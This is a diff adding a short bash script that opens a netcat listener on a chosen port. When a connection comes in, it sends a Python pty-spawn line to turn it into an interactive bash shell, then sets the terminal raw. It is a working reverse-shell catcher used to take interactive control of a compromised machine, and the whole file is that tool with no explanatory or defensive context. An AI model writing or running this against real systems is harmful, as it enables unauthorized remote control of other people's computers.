@@ -1,0 +1,9 @@
+#!/bin/bash
+
+(cat <(echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'") - | nc -lvp $1) & 
+
+echo "netcat listening on port $1"
+
+stty raw -echo 
+
+fg
